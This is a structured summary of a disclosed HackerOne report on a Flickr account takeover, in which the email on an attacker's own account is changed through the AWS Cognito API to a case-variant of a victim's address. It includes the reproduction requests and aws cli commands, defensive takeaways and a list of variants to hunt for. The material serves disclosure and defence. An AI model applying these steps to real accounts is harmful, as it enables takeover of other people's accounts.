# Flickr Account Takeover via AWS Cognito Email Change and Case-Sensitivity Bypass

## Metadata
- **Source:** HackerOne
- **Report:** 1342088 | https://hackerone.com/reports/1342088
- **Submitted:** 2021-09-16
- **Reporter:** lauritz
- **Program:** Flickr (Yahoo)
- **Bounty:** Not specified in report
- **Severity:** critical
- **Vuln:** Account Takeover, Insufficient Input Validation, Case Sensitivity Bypass, Inadequate Email Verification, API Abuse, Privilege Escalation
- **CVEs:** None
- **Category:** auth-crypto

## Summary
Flickr failed to properly validate email address changes made through AWS Cognito's API, allowing attackers to change an attacker-controlled account's email to a victim's email address using case-sensitive variations. The application then permitted login with unverified emails and failed to normalize case during authentication, enabling complete account takeover without user interaction.

## Attack scenario
1. Attacker creates an account with flickr-attacker@example.com and obtains valid AWS Cognito access token via standard authentication
2. Attacker uses the access token with AWS Cognito API to change their account's email to a case-variant of victim's email (e.g., 'flickr-Benign@example.com' instead of 'flickr-benign@example.com')
3. AWS Cognito API accepts the change without verifying the new email address, setting email_verified to false
4. Attacker attempts login to Flickr using the case-variant email with their own password
5. Flickr fails to verify the email is actually verified and accepts the unverified email for authentication
6. Attacker gains full access to the victim's Flickr account using their password with the victim's email address

## Root cause
Multiple chained security failures: (1) Flickr did not implement UI restrictions on AWS Cognito API calls, allowing email changes despite no UI option; (2) Flickr did not validate email_verified flag during login; (3) Flickr normalized email addresses (case-insensitive comparison) during some operations but not others, creating inconsistency; (4) AWS Cognito accepted email updates without requiring verification of the new address

## Attacker mindset
Exploiting security gaps between application layer (Flickr) and authentication layer (AWS Cognito). Attacker recognized that UI restrictions don't prevent direct API abuse and that case sensitivity could bypass email matching logic. Attack required minimal resources: knowledge of victim's email address and ability to create an attacker account.

## Defensive takeaways
- Always validate that email addresses in authentication flows have email_verified=true before granting access
- Implement consistent email normalization (case-insensitive) across ALL authentication code paths
- Add application-level restrictions on sensitive operations performed via underlying authentication APIs, not just UI
- Require email verification via token/link before allowing the new email to be used for login
- Monitor for suspicious email change attempts and implement rate limiting on email modifications
- Implement proper logging and alerting for email changes and failed authentication attempts
- Use case-insensitive email comparisons universally to prevent bypass attacks
- Add secondary authentication (2FA) as additional protection against email-based account takeovers

## Variant hunting
Test other AWS Cognito user attributes (phone_number, locale, etc.) for similar unverified modification issues
Check if other services using AWS Cognito have identical email verification bypass vulnerabilities
Test if updating email via direct Cognito API calls bypasses Flickr's account recovery mechanisms
Investigate if other case-sensitivity issues exist in the authentication flow (username normalization)
Attempt modifying email_verified attribute directly through Cognito API
Test if email changes trigger proper security notifications to the original account
Check if refresh tokens from the modified account work across Flickr services
Test for similar issues with phone number verification and changes

## MITRE ATT&CK
- T1190
- T1589
- T1598
- T1110
- T1098
- T1556
- T1021
- T1133

## Notes
This is a high-impact account takeover vulnerability requiring only knowledge of victim's email address and an attacker-controlled account. The vulnerability exploits the gap between application-level security (UI restrictions) and underlying API security. The case-sensitivity aspect is particularly clever as it exploits inconsistent email normalization. Report demonstrates excellent security research methodology with clear step-by-step reproduction. Flickr's reliance on AWS Cognito without proper validation of critical security properties (email_verified flag) was the fundamental failure.

## Full report
<details><summary>Expand</summary>

Flickr uses [Amazon Cognito](https://aws.amazon.com/de/cognito/) to implement its login functionality.

Furthermore, Flickr does not allow users to change their registered e-mail address via the user interface. This restriction can be bypassed via direct communication with the Amazon Cognito *User Pool* API.

Consider we have the following accounts:
1. flickr-benign@lauritz-holtmann.de (our victim)
2. An arbitrary other account that is controlled by the attacker - in the following flickr-attacker@lauritz-holtmann.de

At first, the malicious actor needs to obtain an Amazon `access_token`. To do so, intercept the login request that is sent from https://identity.flickr.com/:
```http
POST / HTTP/2
Host: cognito-idp.us-east-1.amazonaws.com
[...]

{
    "AuthFlow":"USER_PASSWORD_AUTH",
    "ClientId":"3ck15a1ov4f0d3o97vs3tbjb52",
    "AuthParameters":{
        "USERNAME":"flickr-attacker@lauritz-holtmann.de",
        "PASSWORD":"[REDACTED]",
        "DEVICE_KEY":"us-east-1_07032954-25bf-4781-b596-9d675d901072"
    },
    "ClientMetadata":
    {                
    }
}
```

If the provided credentials for the attacker controlled account are valid, Amazon responds with tokens:
```http
HTTP/2 200 OK
Date: Thu, 16 Sep 2021 22:51:36 GMT
[...]

{
    "AuthenticationResult":    
        {
            "AccessToken":"[REDACTED]",
            "ExpiresIn":3600,
            "IdToken":"[REDACTED]",
            "RefreshToken":"[REDACTED]",
            "TokenType":"Bearer"
        },
    "ChallengeParameters":
        {            
        }
}
```

The `access_token` can be directly used against Amazon's AWS API, for instance using the [AWS Command Line Interface](https://docs.aws.amazon.com/cli/) tool:

```bash
$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQiOiJPVj[...]
{
    "Username": "e28c344[...]",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "e28[...]"
        },
        {
            "Name": "birthdate",
            "Value": "1998-09-17"
        },
        {
            "Name": "email_verified",
            "Value": "true"
        },
        {
            "Name": "locale",
            "Value": "en-us"
        },
        {
            "Name": "given_name",
            "Value": "Axel"
        },
        {
            "Name": "family_name",
            "Value": "Attacker"
        },
        {
            "Name": "email",
            "Value": "flickr-attacker@lauritz-holtmann.de"
        }
    ]
}
```

Using the API, one is able to alter some of the user attributes - including the linked e-mail address:
```bash
$ aws cognito-idp update-user-attributes --region us-east-1 --access-token eyJraWQ[...] --user-attributes Name=email,Value=flickr-Benign@lauritz-holtmann.de
{
    "CodeDeliveryDetailsList": [
        {
            "Destination": "f***@l***.de",
            "DeliveryMedium": "EMAIL",
            "AttributeName": "email"
        }
    ]
}
```

Note that the registered address is **case sensitive**.
As the above output already indicates, at this stage, the e-mail address is not verified:
```bash
$ aws cognito-idp get-user --region us-east-1 --access-token eyJraWQi[...] 
{
    "Username": "e28c34[...]",
    "UserAttributes": [
        {
            "Name": "sub",
            "Value": "e2[...]"
        },
        {
            "Name": "birthdate",
            "Value": "1998-09-17"
        },
        {
            "Name": "email_verified",
            "Value": "false"
        },
        {
            "Name": "locale",
            "Value": "en-us"
        },
        {
            "Name": "given_name",
            "Value": "Axel"
        },
        {
            "Name": "family_name",
            "Value": "Attacker"
        },
        {
            "Name": "email",
            "Value": "flickr-Benign@lauritz-holtmann.de"
        }
    ]
}
```

Strikingly, it is still possible to login at Flickr using the case-sensitive, not-verified victim e-mail address using the attacker's password:
{F1451108}
As the above video illustrates, the attacker has to make sure that within the outgoing HTTP request the capitalization of the e-mail address is as intended.

## Conclusion
The aforementioned behavior can be tracked down to the following root issues
1) Flickr does not expect e-mail addresses to be changed - still it is possible to change a user's address using the AWS Cognito API.
2) Flickr does not check whether the e-mail address is verified on login
3) Flickr normalizes the e-mail address received from AWS cognito, so that collisions are possible

## Impact

Chained as shown above, the aforementioned  vulnerabilities can be used to takeover a user's account without any user interaction. 

A malicious solely needs to know the e-mail address that is linked within a victim's account to link a crafted e-mail address to their account that can then be used to takeover the victim's account.

## Further Notices
All tests were performed against my user accounts. The user account patterns used were as follows:
* lauritz+*@wearehackerone.com
* *@lauritz-holtmann.de

Please let me know if you have any comments or questions.

</details>

---
*Analysed by Claude on 2026-05-11*
